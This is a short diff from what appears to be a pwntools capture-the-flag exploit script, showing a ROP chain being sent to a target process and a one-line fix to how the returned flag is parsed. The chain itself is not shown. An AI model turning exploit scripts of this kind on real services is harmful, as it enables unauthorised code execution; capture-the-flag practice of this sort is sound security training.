@@ -20,5 +20,5 @@ log.success(f"ROP chain : {rop}")
 p.recv()
 p.sendline(rop)
 
-flag = p.recvall().split(b'\n')#[-2]
+flag = p.recvall().split(b'\n')[-2]
 log.success(f"FLAG : {flag}")
